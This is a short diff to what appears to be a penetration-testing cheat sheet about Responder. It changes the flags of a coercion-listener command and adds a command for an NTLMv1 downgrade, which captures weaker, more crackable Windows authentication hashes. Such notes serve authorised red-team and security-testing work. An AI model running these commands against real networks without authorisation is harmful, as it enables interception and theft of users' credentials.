@@ -21,7 +21,11 @@ responder -I eth0 -A
 ```
 # Coersion Listener
 ```
-sudo responder -I eth0 -wrf
+sudo responder -I eth0 -wbf
+```
+# NTLMv1 Downgrade
+```
+sudo responder -I eth0 --lm
 ```
 # Responder Config
 ```
